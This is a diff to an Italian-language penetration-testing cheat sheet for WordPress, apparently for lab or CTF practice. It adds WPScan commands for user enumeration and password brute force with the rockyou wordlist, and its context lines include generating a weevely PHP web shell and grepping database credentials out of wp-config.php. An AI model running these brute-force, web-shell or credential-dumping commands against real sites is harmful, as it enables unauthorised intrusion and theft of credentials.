@@ -40,28 +40,57 @@ Strumento principale per l’enumerazione WordPress: versione, utenti, plugin, t
 * `--api-token` → usa database ufficiale di vulnerabilità (serve token gratuito)
 * `-P` → brute force con wordlist
 * `-U` → specifica username o lista di utenti
+* `--password-attack wp-login` → forza l’attacco sulla pagina di login WP
 
 ### 🔹 Comandi diretti
 
 ```bash
-# Enum base
+# Enum utenti
 wpscan --url http://<target-ip> --enumerate u
 
-# Enum full scan
+# Enum full scan (plugin, temi, utenti)
 wpscan --url http://<target-ip> -e vp,vt,u 
 
-# Enum plugin e versioni vulnerabili
+# Enum plugin + vulnerabilità note
 wpscan --url http://<target-ip> --enumerate p --api-token <TOKEN>
+```
 
-# Enum utenti + brute force password
+---
+
+## 🔑 WPScan – Password Bruteforce
+
+**Perché farlo:**
+Dopo aver enumerato gli utenti, puoi provare password comuni con WPScan.
+
+### 🔹 Attacco base (un solo utente)
+
+```bash
+wpscan --url http://<target-ip> -U admin -P /usr/share/wordlists/rockyou.txt
+```
+
+### 🔹 Attacco multiplo (lista di utenti)
+
+```bash
 wpscan --url http://<target-ip> -U users.txt -P /usr/share/wordlists/rockyou.txt
+```
 
+### 🔹 Specifica la modalità di attacco
+
+```bash
+wpscan --url http://<target-ip> -U admin -P rockyou.txt --password-attack wp-login
+```
+
+### 🔹 Aggressività / Performance
+
+```bash
+# Limita o aumenta i thread
+wpscan --url http://<target-ip> -U admin -P rockyou.txt --max-threads 10
 ```
 
 ### 💾 Salvataggio su file
 
 ```bash
-wpscan --url http://<target-ip> --enumerate u,p,t --api-token <TOKEN> -o wpscan.txt
+wpscan --url http://<target-ip> -U users.txt -P rockyou.txt -o brute_results.txt
 ```
 
 ---
@@ -133,3 +162,4 @@ weevely generate pass123 shell.php
 # Se ottieni accesso al server → dump credenziali MySQL
 cat wp-config.php | grep DB_
 ```
+
